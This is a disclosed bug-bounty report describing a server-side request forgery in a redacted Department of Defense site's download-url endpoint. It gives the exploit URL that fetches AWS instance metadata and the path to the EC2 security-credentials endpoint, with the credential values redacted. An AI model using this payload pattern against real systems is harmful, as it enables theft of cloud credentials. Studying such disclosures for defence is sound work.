---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1624140'
original_report_id: '1624140'
title: SSRF to read AWS metaData at https://█████/ [HtUS]
weakness: Server-Side Request Forgery (SSRF)
team_handle: deptofdefense
created_at: '2022-07-04T14:01:31.493Z'
disclosed_at: '2022-10-14T15:12:17.901Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 46
tags:
- hackerone
- server-side-request-forgery-ssrf
---

# SSRF to read AWS metaData at https://█████/ [HtUS]

## Metadata

- HackerOne Report ID: 1624140
- Weakness: Server-Side Request Forgery (SSRF)
- Program: deptofdefense
- Disclosed At: 2022-10-14T15:12:17.901Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello Team,
While researching your program I found that the domain https://████/ is vulnerable to Server Side Request Frogery Attacks via the url parameter. 
An attacker is able to fetch the aws metadata abusing the SSRF at https://████████/
============================SUMMARY=========================
## Vulnerable URL:
https://███████/

## Vulnerable Path:
/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/

## Final Exploit URL:
https://█████/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/

## Exploited AWS metadata
```
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
```

## Exposed Credentials:
https://█████████/api/v1/download-url?url=http://169.254.169.254/2021-07-15/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
```
{
  "Code" : "Success",
  "LastUpdated" : "2022-07-04T11:22:59Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "███",
  "SecretAccessKey" : "████",
  "Token" : "████
  ```
===========================STEPS TO REPRODUCE==========================
1) Go to the above Exploit URL, i.e; https://█████/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/
2) You will see the AWS Metadata being fetched and exposed.

## Impact

An attacker is able to explore and fertch the AWS metadata via the SSRF. This SSRF can be used to perform other attack vectors as well such as scanning internal ports. A successful SSRF attack can often result in unauthorized actions or access to data within the organization, either in the vulnerable application itself or on other back-end systems that the application can communicate with.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
